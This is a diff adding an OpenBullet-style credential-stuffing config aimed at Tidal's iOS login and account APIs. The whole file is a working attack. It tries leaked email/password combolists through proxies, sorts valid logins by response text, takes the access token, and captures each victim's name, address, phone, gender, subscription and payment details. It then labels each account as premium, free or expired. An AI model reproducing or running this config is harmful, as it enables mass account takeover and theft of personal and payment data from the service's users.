@@ -1,0 +1,203 @@
+[SETTINGS]
+{
+  "Name": "Tidal iOS Api",
+  "SuggestedBots": 120,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-10T18:30:06.5367555+02:00",
+  "AdditionalInfo": "USA Combolist or Mixed Email PAss, Full Capture Config",
+  "Author": "themutalguy",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://login.tidal.com/api/email/user/existing?response_type=code&redirect_uri=tidal%3A%2F%2Flogin%2Fauth&client_id=1MV2MrP38hSCPnzi&code_challenge=pAc0V45g50pJYZdsYT9hnzvHBFz8JQHbs6FfAmneKIE&client_unique_key=0EDDA129-8C0F-43AF-8ED3-F2F05F54A07D&code_challenge_method=S256&appMode=ios&lang=en&restrict_signup=true" 
+  
+  HEADER "Host: login.tidal.com" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "X-Csrf-Token: OX8XNDWH-9ov3yrunnmI3EpLE5HPCi4QNdUU" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: https://login.tidal.com" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1" 
+  HEADER "Content-Length: 60" 
+  HEADER "Accept-Language: en-GB,en;q=0.9" 
+
+#CSRF PARSE "<COOKIES(_csrf-token)>" LR "" "" -> VAR "CSRF" 
+
+REQUEST POST "https://login.tidal.com/api/email/user/existing?response_type=code&redirect_uri=tidal%3A%2F%2Flogin%2Fauth&client_id=1MV2MrP38hSCPnzi&code_challenge=pAc0V45g50pJYZdsYT9hnzvHBFz8JQHbs6FfAmneKIE&client_unique_key=0EDDA129-8C0F-43AF-8ED3-F2F05F54A07D&code_challenge_method=S256&appMode=ios&lang=en&restrict_signup=true" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Host: login.tidal.com" 
+  HEADER "X-Csrf-Token: <CSRF>" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: https://login.tidal.com" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 60" 
+  HEADER "Accept-Language: en-GB,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "equest failed with status code 401" 
+    KEY "WRONG_USERNAME_OR_PASSWORD" 
+    KEY "status\":401" 
+    KEY "GENERIC_ERROR" 
+  KEYCHAIN Success OR 
+    KEY "\"userId\":" 
+    KEY "\"redirectUri\":" 
+
+#userId PARSE "<SOURCE>" LR "\"userId\":" "}" -> VAR "userId" 
+
+#TK PARSE "<SOURCE>" LR "\"redirectUri\":\"tidal://login/auth?code=" "&" -> VAR "TK" 
+
+REQUEST POST "https://auth.tidal.com/v1/oauth2/token?countryCode=US&deviceType=PHONE&locale=en" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: auth.tidal.com" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Accept-Language: en-GB,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: TIDAL/4330 CFNetwork/1325.0.1 Darwin/21.1.0" 
+  HEADER "X-Tidal-Token: 1MV2MrP38hSCPnzi" 
+  HEADER "Content-Length: 752" 
+  HEADER "Connection: close" 
+
+#YASHVIR PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"" -> VAR "YASHVIR" 
+
+REQUEST GET "https://api.tidal.com/v1/sessions?countryCode=US&deviceType=PHONE&locale=en" 
+  
+  HEADER "Host: api.tidal.com" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <YASHVIR>" 
+  HEADER "Accept-Language: en-GB,en;q=0.9" 
+  HEADER "User-Agent: TIDAL/4330 CFNetwork/1325.0.1 Darwin/21.1.0" 
+  HEADER "X-Tidal-Token: 1MV2MrP38hSCPnzi" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#SESSID PARSE "<SOURCE>" LR "{\"sessionId\":\"" "\"" -> VAR "SESSID" 
+
+#id PARSE "<SOURCE>" JSON "id" -> VAR "id" 
+
+#COD PARSE "<SOURCE>" JSON "countryCode" -> VAR "COD" 
+
+#authorizedForOffline PARSE "<SOURCE>" JSON "authorizedForOffline" -> VAR "authorizedForOffline" 
+
+REQUEST GET "https://login.tidal.com/oauth2/me?countryCode=<COD>&deviceType=PHONE&locale=en" 
+  
+  HEADER "Host: login.tidal.com" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <YASHVIR>" 
+  HEADER "Accept-Language: en-GB,en;q=0.9" 
+  HEADER "User-Agent: TIDAL/4330 CFNetwork/1325.0.1 Darwin/21.1.0" 
+  HEADER "X-Tidal-Token: 1MV2MrP38hSCPnzi" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#fullName PARSE "<SOURCE>" JSON "fullName" CreateEmpty=FALSE -> CAP "fullName" 
+
+#address PARSE "<SOURCE>" JSON "address" CreateEmpty=FALSE -> CAP "address" 
+
+#city PARSE "<SOURCE>" JSON "city" CreateEmpty=FALSE -> CAP "city" 
+
+#postalcode PARSE "<SOURCE>" JSON "postalcode" CreateEmpty=FALSE -> CAP "postalcode" 
+
+#phoneNumber PARSE "<SOURCE>" JSON "phoneNumber" CreateEmpty=FALSE -> CAP "phoneNumber" 
+
+#gender PARSE "<SOURCE>" JSON "gender" CreateEmpty=FALSE -> CAP "gender" 
+
+#created PARSE "<SOURCE>" JSON "created" -> VAR "created" 
+
+#Date_Registered FUNCTION UnixTimeToISO8601 "<created>" -> CAP "Date Registered" 
+
+#newUser PARSE "<SOURCE>" JSON "newUser" CreateEmpty=FALSE -> CAP "newUser" 
+
+REQUEST GET "https://api.tidal.com/v1/users/<userId>/blocks/ids?countryCode=<COD>&deviceType=PHONE&locale=en" 
+  
+  HEADER "Host: api.tidal.com" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <YASHVIR>" 
+  HEADER "Accept-Language: en-GB,en;q=0.9" 
+  HEADER "User-Agent: TIDAL/4330 CFNetwork/1325.0.1 Darwin/21.1.0" 
+  HEADER "X-Tidal-Token: 1MV2MrP38hSCPnzi" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#Artists PARSE "<SOURCE>" LR "{\"artists\":[" "]" -> VAR "Artists" 
+
+#Tracks PARSE "<SOURCE>" LR "\"tracks\":[" "]" -> VAR "Tracks" 
+
+#Videos PARSE "<SOURCE>" LR "\"videos\":[" "]}" -> VAR "Videos" 
+
+REQUEST GET "https://api.tidal.com/v1/users/<userId>/subscription?countryCode=<COD>&deviceType=PHONE&locale=en" 
+  
+  HEADER "Host: api.tidal.com" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-GB,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "If-None-Match: \"250754378\"" 
+  HEADER "User-Agent: TIDAL/4330 CFNetwork/1325.0.1 Darwin/21.1.0" 
+  HEADER "X-Tidal-Token: 1MV2MrP38hSCPnzi" 
+  HEADER "Authorization: Bearer <YASHVIR>" 
+
+#Account_Status PARSE "<SOURCE>" JSON "status" CreateEmpty=FALSE -> CAP "Account Status" 
+
+#premiumAccess PARSE "<SOURCE>" JSON "premiumAccess" CreateEmpty=FALSE -> CAP "premiumAccess" 
+
+#Plan_Type PARSE "<SOURCE>" LR "\"subscription\":{\"type\":\"" "\"" CreateEmpty=FALSE -> CAP "Plan Type" 
+
+#Payment_Methods PARSE "<SOURCE>" LR "\"paymentType\":\"" "\"}" CreateEmpty=FALSE -> CAP "Payment Methods" 
+
+#Expiry PARSE "<SOURCE>" LR "{\"validUntil\":\"" "T" CreateEmpty=FALSE -> CAP "Expiry" 
+
+#AUTHOR FUNCTION Constant "themutalguy" -> CAP "Config By " 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<premiumAccess>" Contains "false" 
+  KEYCHAIN Success OR 
+    KEY "<premiumAccess>" Contains "true" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<Account Status>" Contains "EXPIRED" 
+    KEY "<Account Status>" Contains "INACTIVE" 
+
